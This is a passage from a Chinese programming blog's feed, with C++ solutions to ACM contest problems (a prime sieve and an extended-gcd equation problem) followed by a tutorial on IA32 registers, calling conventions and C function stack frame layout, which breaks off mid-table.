class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> tot=<span class="number">0</span>,prime[<span class="number">100000</span>];</div><div class="line"><span class="keyword">bool</span> isprime[MAX];</div><div class="line"><span class="keyword">int</span> sum[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">memset</span>(isprime,<span class="number">1</span>,<span class="keyword">sizeof</span>(isprime));</div><div class="line">    isprime[<span class="number">1</span>]=<span class="literal">false</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;MAX; i++) &#123;</div><div class="line">        <span class="keyword">if</span>(isprime[i])prime[++tot]=i;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=tot&amp;&amp;i*prime[j]&lt;MAX; j++) &#123;</div><div class="line">            isprime[i*prime[j]]=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">if</span>(i%prime[j]==<span class="number">0</span>)<span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;MAX;i++) &#123;</div><div class="line">        sum[i]=sum[i<span class="number">-1</span>]+isprime[i];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> T,n,d;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmaxp</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (prime[i]&gt;(n<span class="number">-1</span>)/d) <span class="keyword">return</span> prime[i<span class="number">-1</span>];</div><div class="line">        <span class="keyword">if</span> (d%prime[i]==<span class="number">0</span>) <span class="keyword">return</span> prime[i];</div><div class="line">        <span class="keyword">if</span> (prime[i]*prime[i]&gt;d) <span class="keyword">return</span> min(d,(n<span class="number">-1</span>)/d);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    init();</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;d);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum[getmaxp()]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><em>ps.</em> 其实有一个更显然的做法，直接依次枚举质数即可。</p><h3 id="G-One-Person-Game"><a href="#G-One-Person-Game" class="headerlink" title="G - One Person Game"></a><a href="https://vjudge.net/problem/ZOJ-3593" target="_blank" rel="noopener">G - One Person Game</a></h3><p>抽象一下，有方程$ax+by+cz=B-A$成立，其中$c=a+b$，求$|x|+|y|+|z|$的最小值。<br>有个结论不太会证，简单来说，$x,y,z$均不为$0$时不会比有一个为$0$时更好。（把$a+b$变成$c$或者把$c$拆掉）<br>那么其实就是求满足$ax+by=C$的$|x|+|y|$的最小值，然后修改系数求三遍比较一下。<br>当$x,y$异号时，显然是让$x,y$都尽量接近0；当$x,y$同号时，因为系数都是正的，其实也是在$x$最接近$0$或者$y$最接近$0$的时候取到极值。<br>综上，我们只要分别考虑$x$最接近$0$和$y$最接近$0$的情况，各有两个。又因为C/C++的整除符号在被除数是负数时不是向下取整，我们可以更暴力地每次考虑三种情况。<br>复杂度$O(logV)$，$V$为$a,b$的值域大小。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"><span class="keyword">const</span> ll INF=<span class="number">1L</span>L&lt;&lt;<span class="number">60</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">extend_gcd</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a,<span class="keyword">long</span> <span class="keyword">long</span> b,<span class="keyword">long</span> <span class="keyword">long</span> &amp;x,<span class="keyword">long</span> <span class="keyword">long</span> &amp;y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>&amp;&amp;b==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//无最大公约数</span></div><div class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>) &#123;</div><div class="line">        x=<span class="number">1</span>;</div><div class="line">        y=<span class="number">0</span>;</div><div class="line">        <span class="keyword">return</span> a;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> d=extend_gcd(b,a%b,y,x);</div><div class="line">    y-=a/b*x;</div><div class="line">    <span class="keyword">return</span> d;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">calc</span><span class="params">(ll x,ll y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(x)+<span class="built_in">abs</span>(y);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">solve</span><span class="params">(ll a,ll b,ll c)</span></span></div><div class="line">&#123;</div><div class="line">    ll x,y,t;</div><div class="line">    ll g=extend_gcd(a,b,x,y);</div><div class="line">    <span class="keyword">if</span> (c%g) <span class="keyword">return</span> INF;</div><div class="line">    a/=g;b/=g;c/=g;</div><div class="line">    x*=c;y*=c;</div><div class="line">    t=x/b;x-=b*t;y+=a*t;</div><div class="line">    ll res=calc(x,y);</div><div class="line">    res=min(res,calc(x-b,y+a));</div><div class="line">    res=min(res,calc(x+b,y-a));</div><div class="line">    t=y/a;x+=b*t;y-=a*t;</div><div class="line">    res=min(res,calc(x,y));</div><div class="line">    res=min(res,calc(x+b,y-a));</div><div class="line">    res=min(res,calc(x-b,y+a));</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        ll A,B,a,b;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld%lld"</span>,&amp;A,&amp;B,&amp;a,&amp;b);</div><div class="line">        ll ans=solve(a,b,B-A);</div><div class="line">        ans=min(ans,solve(a,a+b,B-A));</div><div class="line">        ans=min(ans,solve(b,a+b,B-A));</div><div class="line">        <span class="keyword">if</span> (ans==INF) <span class="built_in">puts</span>(<span class="string">"-1"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C语言函数调用栈（一）</title>
      <url>/blog/2018/07/19/c-stack-frame/</url>
      <content type="html"><![CDATA[<p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p><p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p><h3 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h3><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：<center><br><img src="/blog/images/271639137915732.jpg" alt="图1 IA32处理器寄存器"><br>图1 IA32处理器寄存器</center></p><p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令imull/mull/cltd/idivl/divl要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax (lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。</p><p>对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</p><p>在x86处理器中，EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p><p>不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位。</p><p>编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p><blockquote><p>   【扩展阅读】栈帧指针寄存器<br>    为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。<br>    因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。<br>    在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。</p></blockquote><h3 id="2-寄存器使用约定"><a href="#2-寄存器使用约定" class="headerlink" title="2 寄存器使用约定"></a>2 寄存器使用约定</h3><p>程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。</p><p>根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p><p>当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p><h3 id="3-栈帧结构"><a href="#3-栈帧结构" class="headerlink" title="3 栈帧结构"></a>3 栈帧结构</h3><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p><p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p><p>为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p>函数调用栈的典型内存布局如下图所示：<center><br><img src="/blog/images/271644419475745.jpg" alt="图2 函数调用栈的典型内存布局"><br>图2 函数调用栈的典型内存布局</center></p><p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。  此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p><p>从图中可以看出，函数调用时入栈顺序为</p><p><code>实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N</code></p><p>其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p>EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：<center><br><img src="/blog/images/271650059007975.jpg" alt="图3 函数调用栈的可能内存布局"><br>图3 函数调用栈的可能内存布局</center></p><p>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。</p><p>以下代码用于函数栈布局示例：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//StackFrame.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> Strt&#123;</div><div class="line">    <span class="keyword">int</span> member1;</div><div class="line">    <span class="keyword">int</span> member2;</div><div class="line">    <span class="keyword">int</span> member3;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ADDR(x)     printf(<span class="meta-string">"&amp;"</span>#x<span class="meta-string">" = %p\n"</span>, &amp;x)</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="keyword">int</span> para1, <span class="keyword">int</span> para2, <span class="keyword">int</span> para3)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> locVar1 = <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> locVar2 = <span class="number">2</span>;</div><div class="line">    <span class="keyword">int</span> locVar3 = <span class="number">3</span>;</div><div class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</div><div class="line">    <span class="keyword">struct</span> Strt tStrt = &#123;<span class="number">0</span>&#125;;</div><div class="line">    PRINT_ADDR(para1); <span class="comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span></div><div class="line">    PRINT_ADDR(para2);</div><div class="line">    PRINT_ADDR(para3);</div><div class="line">    PRINT_ADDR(locVar1);</div><div class="line">    PRINT_ADDR(locVar2);</div><div class="line">    PRINT_ADDR(locVar3);</div><div class="line">    PRINT_ADDR(arr);</div><div class="line">    PRINT_ADDR(arr[<span class="number">0</span>]);</div><div class="line">    PRINT_ADDR(arr[<span class="number">1</span>]);</div><div class="line">    PRINT_ADDR(arr[<span class="number">2</span>]);</div><div class="line">    PRINT_ADDR(tStrt);</div><div class="line">    PRINT_ADDR(tStrt.member1);</div><div class="line">    PRINT_ADDR(tStrt.member2);</div><div class="line">    PRINT_ADDR(tStrt.member3);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> locMain1 = <span class="number">1</span>, locMain2 = <span class="number">2</span>, locMain3 = <span class="number">3</span>;</div><div class="line">    PRINT_ADDR(locMain1);</div><div class="line">    PRINT_ADDR(locMain2);</div><div class="line">    PRINT_ADDR(locMain3);</div><div class="line">    StackFrameContent(locMain1, locMain2, locMain3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</div><div class="line">    <span class="built_in">memset</span>(&amp;locMain2, <span class="number">0</span>, <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>编译链接并执行后，输出打印如下：<center><br><img src="/blog/images/271651489169470.jpg" alt="图4 StackFrame输出"><br>图4 StackFrame输出</center></p><p>函数栈布局示例如下图所示。为直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54，以此类推。<center><br><img src="/blog/images/271652449633815.jpg" alt="图5 StackFrame栈帧"><br>图5 StackFrame栈帧</center></p><p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p><p>函数调用以值传递时，传入的实参(locMain1~3)与被调函数内操作的形参(para1~3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p><p>此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p><p>注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。</p><blockquote><p>【扩展阅读】函数局部变量布局方式</p><p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p><p>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p></blockquote><h3 id="4-堆栈操作"><a href="#4-堆栈操作" class="headerlink" title="4 堆栈操作"></a>4 堆栈操作</h3><p>函数调用时的具体步骤如下：</p><ol><li><p>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。<br>注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p></li><li><p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p></li><li><p>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p></li><li><p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p></li><li><p>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p></li><li><p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p></li><li><p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p></li><li><p>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p></li><li><p>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p></li></ol><p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p><p>以下介绍函数调用过程中的主要指令。</p><p><strong>压栈(push)</strong>：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p><p><strong>出栈(pop)</strong>：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。<center><br><img src="/blog/images/271656343069114.jpg" alt="图6 出栈入栈操作示意 "><br>图6 出栈入栈操作示意</center></p><p>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p><p><strong>调用(call)</strong>：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p><p><strong>离开(leave)</strong>： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</p><p><strong>返回(ret)</strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p><p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #837d7c;"><br><td valign="top" width="83"><br><p align="center"><strong>&nbsp;</strong></p><br></td><br><td valign="top" width="130"><br><p align="center"><strong>指令序列</strong></p><br></td><br><td valign="top" width="465"><br><p align="center"><strong>含义</strong></p><br></td><br></tr><br><tr><br><td rowspan="4" width="83"><br><p>函数序</p><br><p>(prologue)</p><br></td><br><td width="130"><br><p>push %ebp</p><br></td><br><td valign="top" width="465"><br><p align="left">将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</p><br></td><br></tr><br><tr><br><td width="130"><br><p>mov %esp, %ebp</p><br></td><br><td valign="top" width="465"><br><p align="left">将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</p><br></td><br></tr><br><tr><br><td width="130"><br><p>sub &lt;n&gt;, %esp</p><br></td><br><td valign="top" width="465"><br><p align="left">将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。&lt;n&gt;为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</p><br></td><br></tr><br><tr><br><td width="130"><br><p>push &lt;r&gt;</p><br></td><br><td valign="top" width="465"><br><p align="left">可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</p><br></td><br></tr><br><tr><br><td rowspan="4" width="83"><br><p>函数跋</p><br><p>(epilogue)</p><br></td><br><td width="130"><br><p>pop &lt;r&gt;</p><br></td><br><td valign="top" width="465"><br><p align="left">可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</p><br></td><br></tr><br><tr><br><td width="130"><br><p>mov 